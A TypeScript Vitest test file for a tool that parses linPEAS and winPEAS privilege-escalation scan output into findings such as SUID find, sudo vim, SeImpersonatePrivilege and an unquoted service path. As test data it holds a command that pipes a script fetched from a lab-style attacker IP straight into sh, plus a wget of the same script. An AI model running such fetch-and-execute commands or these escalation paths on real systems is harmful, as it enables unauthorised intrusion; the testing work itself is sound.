import { describe, expect, it } from 'vitest'
import { interpret } from '../../../engines/interpret'
import linpeasPlain from '../../fixtures/interpret/linpeas-plain.txt?raw'
import linpeasAnsi from '../../fixtures/interpret/linpeas-ansi.txt?raw'
import winpeasPlain from '../../fixtures/interpret/winpeas-plain.txt?raw'

const ranOn = { ranOn: true as const }
const LIN_CMD = 'curl -L http://10.10.14.1/linpeas.sh | sh'
const WIN_CMD = 'C:\\Windows\\Temp\\winPEASx64.exe'
const titles = (vs: { title: string }[]) => vs.map((v) => v.title)

describe('PEAS', () => {
  it('plain linPEAS files only GTFOBins-backed vectors', () => {
    const r = interpret({ command: LIN_CMD, output: linpeasPlain })
    expect(r.parsers).toContain('peas')
    expect([...titles(r.vectors)].sort()).toEqual([
      'Capability cap_setuid on /usr/bin/python3.10 (GTFOBins)',
      'SUID /usr/bin/find (GTFOBins)',
      'sudo /usr/bin/vim as ALL (GTFOBins)',
    ])
    expect(r.vectors.every((v) => 'ranOn' in v.host)).toBe(true)
    expect(r.ticks).toContainEqual({ host: ranOn, goalId: 'h-pe-lin-auto', parser: 'peas' })
  })

  it('ANSI linPEAS files the red-on-yellow lines', () => {
    const r = interpret({ command: LIN_CMD, output: linpeasAnsi })
    expect(titles(r.vectors).filter((t) => t.startsWith('PEAS: '))).toEqual([
      'PEAS: (ALL) NOPASSWD: /usr/bin/vim',
      'PEAS: -rwsr-xr-x 1 root root 320K Jan  1  2026 /usr/bin/find',
      'PEAS: /usr/bin/python3.10 cap_setuid=ep',
    ])
    expect(r.ticks).toContainEqual({ host: ranOn, goalId: 'h-pe-lin-auto', parser: 'peas' })
  })

  it('ANSI path cuts a long red-on-yellow line to 80 characters and skips red-only lines', () => {
    const long = 'x'.repeat(120)
    const out = `╔══════════╣ Demo\n\x1b[1;31;103m  ${long}\x1b[0m\n\x1b[1;31mred only\x1b[0m\n`
    const r = interpret({ command: LIN_CMD, output: out })
    expect(titles(r.vectors)).toEqual([`PEAS: ${'x'.repeat(80)}`])
  })

  it('plain winPEAS files SeImpersonate and the unquoted path', () => {
    const r = interpret({ command: WIN_CMD, output: winpeasPlain })
    expect(r.parsers).toEqual(['peas'])
    expect(titles(r.vectors)).toEqual([
      'SeImpersonatePrivilege abuse',
      'AlwaysInstallElevated set',
      'Unquoted service path AcmeSyncSvc',
    ])
    expect(r.ticks).toEqual([{ host: ranOn, goalId: 'h-pe-win-auto', parser: 'peas' }])
  })

  it('winPEAS needs both AlwaysInstallElevated lines to file it', () => {
    const half = winpeasPlain.replace('AlwaysInstallElevated set to 1 in HKCU!', 'AlwaysInstallElevated set to 0 in HKCU')
    expect(titles(interpret({ command: WIN_CMD, output: half }).vectors)).not.toContain('AlwaysInstallElevated set')
  })

  it('a linPEAS fixture with no findings files no vectors but still ticks h-pe-lin-auto', () => {
    const quiet = linpeasPlain
      .replace('    (ALL) NOPASSWD: /usr/bin/vim\n', '')
      .replace(/^-rwsr-xr-x .* \/usr\/bin\/find$/m, '')
      .replace('/usr/bin/python3.10 cap_setuid=ep\n', '')
    const r = interpret({ command: LIN_CMD, output: quiet })
    expect(r.vectors).toEqual([])
    expect(r.ticks).toContainEqual({ host: ranOn, goalId: 'h-pe-lin-auto', parser: 'peas' })
  })

  it('other output does not trigger PEAS', () => {
    expect(interpret({ command: 'ls', output: 'hello\n' }).parsers).not.toContain('peas')
  })

  it('a download of the script is not a PEAS run', () => {
    const r = interpret({ command: 'wget http://10.10.14.7/linpeas.sh', output: "Saving to: 'linpeas.sh'\n\nlinpeas.sh 100%[===>] 800K in 0.1s\n" })
    expect(r.parsers).not.toContain('peas')
    expect(r.ticks).toEqual([])
    expect(r.vectors).toEqual([])
  })

  it('coloured winPEAS still files the privilege vector', () => {
    const coloured = winpeasPlain.replace(/^(.*SeImpersonatePrivilege.*)$/m, '\x1b[1;32m$1\x1b[0m')
    const r = interpret({ command: WIN_CMD, output: coloured })
    expect(titles(r.vectors)).toContain('SeImpersonatePrivilege abuse')
  })

  it('coloured linPEAS files a GTFOBins SUID printed without red-on-yellow', () => {
    const coloured = linpeasPlain.replace(/^(-rwsr-xr-x .* \/usr\/bin\/find)$/m, '\x1b[1;31m$1\x1b[0m')
    const r = interpret({ command: LIN_CMD, output: coloured })
    expect(titles(r.vectors)).toContain('SUID /usr/bin/find (GTFOBins)')
    expect(titles(r.vectors).some((t) => t.startsWith('PEAS: '))).toBe(false)
  })

  it('boxed headers with Windows paths and no banner are winPEAS', () => {
    const out = '╔══════════╣ Current Token privileges\n    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED\n    C:\\Windows\\Temp\n'
    const r = interpret({ command: 'run.exe', output: out })
    expect(r.ticks).toEqual([{ host: ranOn, goalId: 'h-pe-win-auto', parser: 'peas' }])
  })
})
